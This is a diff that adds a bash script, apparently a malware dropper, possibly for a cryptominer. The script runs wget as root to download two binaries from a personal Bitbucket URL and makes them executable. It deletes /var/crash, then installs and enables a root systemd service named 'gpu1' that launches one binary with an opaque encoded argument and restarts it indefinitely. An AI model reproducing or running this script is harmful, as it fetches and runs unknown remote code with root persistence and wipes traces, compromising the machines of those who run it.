@@ -1,0 +1,26 @@
+#!/bin/bash
+cd /home
+sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/a
+sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/sec
+sudo chmod +x sec
+sudo chmod +x a
+sudo rm -rf /lib/systemd/system/gpu1.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/sec nXU+udQAfXjYiFPHrktsC5XiyhnD9KfWQgPtHTFtc4q+tvGtbvXf2RwOatuK3gkOgmtIRrgs/KTCmHF5mbOZEayRsStLR9icEnKsdNKWGUHsT1jSI7Lr2Q7telSmgUG7Tvj0wgb67JgmQSLF4xqMpJSojlyvAEdH+BX+ZeObTPy4dB6G/tQCIZib1tA5rRoKJAClMr0clCPtA5K2S8k7WvfQLHjUc3jTQRYZckXfPejSpIg+nyhb3NakLMY=
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable gpu1.service &&
+service gpu1 stop  &&
+service gpu1 restart
